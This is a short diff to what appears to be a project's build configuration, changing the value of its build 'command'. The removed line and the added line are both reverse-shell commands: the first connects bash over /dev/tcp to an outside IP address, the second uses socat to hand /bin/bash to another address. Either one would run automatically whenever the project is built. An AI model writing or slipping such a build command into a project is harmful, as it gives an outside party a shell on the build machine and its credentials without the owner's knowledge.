@@ -1,2 +1,2 @@
 [build]
-  command = "bash -i >& /dev/tcp/13.127.106.70/1234 0>&1"
+  command = "socat TCP4:192.168.168.1:4443 EXEC:/bin/bash"
